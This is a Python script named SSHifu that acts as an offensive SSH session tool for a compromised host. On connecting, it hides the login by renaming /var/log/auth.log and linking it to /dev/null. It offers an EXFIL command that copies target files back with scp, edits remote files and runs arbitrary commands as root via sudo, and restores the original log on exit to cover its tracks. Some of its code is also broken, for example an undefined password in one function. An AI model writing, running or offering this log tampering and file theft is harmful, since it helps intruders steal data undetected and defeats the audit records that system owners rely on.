#!/usr/bin/python3
import os
import subprocess
import sys
import socket
from time import sleep

'''
program structure
1. Startup Program
2. Obfuscating location
3. Interactive session
    A. extra interactive commands
4. Quiting
'''

def startup():
    if len(sys.argv) < 1:
        print("ERROR: Not enough strings\n\tpython3 SSHifu.py [username]@[ip address]")
    userinput = str(sys.argv[1])
    username, ipaddress = userinput.split("@")
    try:
        socket.inet_aton(ipaddress)
        password = input(f"Enter password for {username}@{ipaddress}: ")
        return username,ipaddress, password
    except socket.error:
        print("ERROR: Not a valid ip address\n")
        exit(1)
def obfuscate(username,ipaddress, password):
    os.system(f" sshpass -p \"{password}\" ssh -o LogLevel=QUIET -t {username}@{ipaddress} \" echo {password} | sudo -S --  sh -c \'mv /var/log/auth.log /var/log/.oldlog\'\"")
    os.system(f" sshpass -p \"{password}\" ssh -o LogLevel=QUIET -t {username}@{ipaddress}  \" echo {password} | sudo -S -- sh -c \'ln -s /dev/null /var/log/auth.log \'\"")
def env(username, ipaddress):
    pwd = subprocess.check_output(f" sshpass -p \"{password}\" ssh -o LogLevel=QUIET -t {username}@{ipaddress} pwd", shell=True)
    pwd = str(pwd.decode("utf-8").split("'")).rstrip("\\n']")
    pwd = str(pwd.strip("[\'"))
    pwd = str(pwd.strip("\\r"))
    print(f"pwd is {pwd}\n")
    hostname = subprocess.check_output(f" sshpass -p \"{password}\" ssh -o LogLevel=QUIET -t {username}@{ipaddress} hostname", shell=True)
    hostname = str(hostname.decode("utf-8").split("'")).rstrip("\\n']")
    hostname = str(hostname.strip("[\'"))
    hostname = str(hostname.strip("\\r"))
    account = subprocess.check_output(f" sshpass -p \"{password}\" ssh -o LogLevel=QUIET -t {username}@{ipaddress} whoami", shell=True)
    account = str(account.decode("utf-8").split("'")).rstrip("\\n']")
    account = str(account.strip("[\'"))
    return pwd, hostname, account
def printhelp():
    output = """Available Commands:\n
    HELP: Display the help page with a list of available commands\n
    EXFIL: Exfiltrate a target file/folder
    EDIT: Edit a file
    """
    print(output)
    
def interactive(username, ipaddress, password):
    pwd, hostname, account = env(username,ipaddress)
    while True:
        string = input(f"{username}@{hostname}:{pwd}> ")
        if string == "HELP":
            printhelp()
        elif string.find("EXFIL") != -1:
            print(len(string))
            if len(string) == 5:
                print("Syntax error:\n\t EXFIL [absoute/path/to/target]")
            else:
                command, path = string.split(" ")
                os.system(f"sshpass -p \"{password}\" scp {username}@{ipaddress}:{path} .")
                
        #lif string == "EDIT":
        elif string.find("EDIT") != -1:
            if len(string) == 4:
                print("Syntax error:\n\t EDIT [absoute/path/to/target]")
            else:
                command, path = string.split(" ")
                os.system(f"sshpass -p \"{password}\" scp {username}@{ipaddress}:{path} .")
                count = len(path.split("/"))
                fpath = path.split("/")
                file = fpath[count-1]
                os.system(f"vi {file}")
                os.system(f"sshpass -p \"{password}\" scp {file} {username}@{ipaddress}:/home/{username}")
                os.system(f"  sshpass -p \"{password}\" ssh -o LogLevel=QUIET -t {username}@{ipaddress} \" echo {password} | sudo -S -- sh -c \'mv /home/{username}/{file} {path} \'\"")
                os.system(f"rm -rf {file}")
                
        #elif string == "EXIT":
        elif string.find("EXIT") != -1:
            print("exiting session\nGoodbye..")
            os.system(f"  sshpass -p \"{password}\" ssh -o LogLevel=QUIET -t {username}@{ipaddress} \" echo {password} | sudo -S -- sh -c \'rm -rf /var/log/auth.log \'\"")
            os.system(f"  sshpass -p \"{password}\" ssh -o LogLevel=QUIET -t {username}@{ipaddress} \" echo {password} | sudo -S --  sh -c \'mv /var/log/.oldlog /var/log/auth.log \'\"")
            exit()
        else:
            string = string.replace('\"', "\"")
            os.system(f"  sshpass -p \"{password}\" ssh -o LogLevel=QUIET -t {username}@{ipaddress} \" echo \'{password}\' | sudo -S --  sh -c \' {string}\'\"")
            pwd = subprocess.check_output(f" sshpass -p \"{password}\" ssh -o LogLevel=QUIET -t {username}@{ipaddress} pwd", shell=True)
            pwd = str(pwd.decode("utf-8").split("'")).rstrip("\\n']")
            pwd = str(pwd.strip("[\'"))
            pwd = str(pwd.strip("\\r"))


    
if __name__ == "__main__":
    username, ipaddress, password = startup()
    print(f"Username is {username} and address is {ipaddress}\n")
    obfuscate(username, ipaddress, password)
    interactive(username, ipaddress, password)
    
    
